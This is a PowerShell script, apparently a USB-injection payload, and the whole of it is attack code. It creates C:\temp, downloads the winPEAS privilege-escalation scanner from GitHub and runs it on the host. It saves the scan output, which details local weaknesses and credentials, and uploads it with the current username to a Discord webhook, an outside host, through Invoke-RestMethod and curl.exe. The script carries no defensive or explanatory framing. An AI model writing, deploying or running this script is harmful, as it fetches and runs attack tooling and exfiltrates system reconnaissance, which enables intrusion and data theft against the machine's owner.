function Create-Folder {
    param(
        [string]$folderPath
    )

    New-Item -ItemType Directory -Path $folderPath
}


Create-Folder -folderPath "C:\temp"

$dir = "C:\temp"
function Run-winPeas {
    
    Invoke-WebRequest -Uri "https://github.com/carlospolop/PEASS-ng/releases/download/20230101/winPEASx64.exe" -OutFile "$dir\winpeas.exe"

    & "$dir\winpeas.exe" all > "$dir\peas_output.txt"
}

Run-winPeas


function Upload-Discord {

    [CmdletBinding()]
    param (
        [parameter(Position = 0, Mandatory = $False)]
        [string]$file,
        [parameter(Position = 1, Mandatory = $False)]
        [string]$text 
    )

    $hookurl = "$dc"

    $Body = @{
        'username' = $env:username
        'content'  = $text
    }

    if (-not ([string]::IsNullOrEmpty($text))) {
        Invoke-RestMethod -ContentType 'Application/Json' -Uri $hookurl  -Method Post -Body ($Body | ConvertTo-Json)
    };

    if (-not ([string]::IsNullOrEmpty($file))) { curl.exe -F "file1=@$file" $hookurl }
}

if (-not ([string]::IsNullOrEmpty($dc))) { Upload-Discord -file $dir\peas_output.txt }



############################################################################################################################################################
#RI $dir/output.txt